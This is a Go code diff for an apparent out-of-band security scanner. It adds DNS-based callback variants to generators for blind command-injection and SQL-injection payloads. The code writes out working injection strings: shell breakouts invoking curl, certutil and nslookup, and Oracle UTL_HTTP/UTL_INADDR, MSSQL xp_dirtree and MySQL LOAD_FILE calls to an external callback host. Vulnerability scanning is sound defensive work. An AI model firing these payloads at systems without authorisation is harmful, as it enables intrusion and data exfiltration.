@@ -146,17 +146,35 @@ func (s *OASTScanner) Run(ctx context.Context, targetID string, logFn LogFunc) e
 	return nil
 }
 
+// oobTokenFromCB extracts the probe token (the last path segment) from a
+// /oob/<token> callback URL. Falls back to the bare "rcnoob" prefix if the URL
+// has no path segment, so a caller never builds a token-less payload by accident.
+func oobTokenFromCB(cb string) string {
+	if i := strings.LastIndexByte(cb, '/'); i >= 0 && i+1 < len(cb) {
+		return cb[i+1:]
+	}
+	return "rcnoob"
+}
+
 // rceOOBPayloads wraps an HTTP callback in the common command-injection breakouts
-// (Unix and Windows). fetch helpers curl/wget cover Linux; certutil covers Windows.
-func rceOOBPayloads(cb string) []string {
+// (Unix and Windows). fetch helpers curl/wget cover Linux; certutil covers
+// Windows. dnsHost, when non-empty, is a token-bearing <token>.<zone> name served
+// by our authoritative DNS listener: a `nslookup <dnsHost>` is then attributable
+// even on a target with DNS-only egress (no HTTP reach to us). Without a DNS zone
+// the nslookup falls back to the bare callback host, which cannot be correlated
+// but still proves *a* lookup occurred to an operator watching the listener.
+func rceOOBPayloads(cb, dnsHost string) []string {
 	// nslookup accepts a host, not an HTTP path. Passing the historical
 	// "host/oob/token" string made the DNS-only Windows fallback syntactically
 	// invalid and silently lost blind command-injection callbacks.
-	host := oobHostOnly(cb)
-	if host == "" {
-		host = stripScheme(cb)
+	nsHost := dnsHost
+	if nsHost == "" {
+		nsHost = oobHostOnly(cb)
+		if nsHost == "" {
+			nsHost = stripScheme(cb)
+		}
 	}
-	return []string{
+	out := []string{
 		";curl -s " + cb + ";",
 		"|curl -s " + cb,
 		"||curl -s " + cb,
@@ -168,8 +186,20 @@ func rceOOBPayloads(cb string) []string {
 		"& curl -s " + cb,
 		// Windows
 		"& certutil -urlcache -f " + cb + " x.txt",
-		"| nslookup " + host,
+		"| nslookup " + nsHost,
 	}
+	if dnsHost != "" {
+		// DNS-only egress: a bare lookup of the token-bearing name is caught by the
+		// authoritative listener even when no shell fetch can reach us over HTTP.
+		out = append(out,
+			";nslookup "+dnsHost+";",
+			"$(nslookup "+dnsHost+")",
+			"`nslookup "+dnsHost+"`",
+			"& nslookup "+dnsHost,
+			";host "+dnsHost+";",
+		)
+	}
+	return out
 }
 
 // sqliOOBPayloads builds out-of-band SQL-injection payloads that force the
@@ -182,21 +212,26 @@ func rceOOBPayloads(cb string) []string {
 //	MSSQL  : xp_dirtree \\host\token (SMB/DNS resolution, no OS command).
 //	MySQL  : LOAD_FILE over UNC (SMB/DNS lookup). PostgreSQL has no safe,
 //	         built-in network primitive, so no OS-command payload is attempted.
-func sqliOOBPayloads(cb, host string) []string {
-	token := "rcnoob"
-	if i := strings.LastIndexByte(cb, '/'); i >= 0 && i+1 < len(cb) {
-		token = cb[i+1:]
-	}
-	uncHost := oobHostOnly(cb)
+//
+// dnsHost, when set, is the token-bearing <token>.<zone> name our authoritative
+// DNS listener answers for. The UNC/xp_dirtree/LOAD_FILE primitives resolve their
+// host via DNS before any SMB connection, so using dnsHost makes these catchable
+// even against a DB whose only egress is DNS — the highest-value blind-SQLi path.
+func sqliOOBPayloads(cb, host, dnsHost string) []string {
+	token := oobTokenFromCB(cb)
+	uncHost := dnsHost
 	if uncHost == "" {
-		uncHost = host
+		uncHost = oobHostOnly(cb)
+		if uncHost == "" {
+			uncHost = host
+		}
 	}
 	unc := `\\` + uncHost + `\` + token
 	oracle := "(SELECT UTL_HTTP.REQUEST('" + cb + "') FROM dual)"
 	oracleURI := "(SELECT HTTPURITYPE('" + cb + "').GETCLOB() FROM dual)"
 	mssqlDir := "EXEC master..xp_dirtree '" + unc + "',1,1"
 
-	return []string{
+	out := []string{
 		// Oracle — inline subselect (string and numeric contexts).
 		"'||" + oracle + "||'",
 		"'||" + oracleURI + "||'",
@@ -209,6 +244,18 @@ func sqliOOBPayloads(cb, host string) []string {
 		// Generic subquery UNC for engines resolving the path during planning.
 		"' UNION SELECT LOAD_FILE('" + unc + "')-- -",
 	}
+	if dnsHost != "" {
+		// Oracle DNS-only exfil: UTL_INADDR.GET_HOST_ADDRESS forces a pure DNS
+		// resolution of the token-bearing name — no HTTP, no SMB required.
+		inaddr := "(SELECT UTL_INADDR.GET_HOST_ADDRESS('" + dnsHost + "') FROM dual)"
+		out = append(out,
+			"'||"+inaddr+"||'",
+			"1||"+inaddr,
+			// Oracle DBMS_LDAP DNS path (11g+ where UTL_INADDR is locked down).
+			"'||(SELECT DBMS_LDAP.INIT('"+dnsHost+"',80) FROM dual)||'",
+		)
+	}
+	return out
 }
 
 func (s *OASTScanner) newProbe(targetID, url, param, kind, sink string) string {
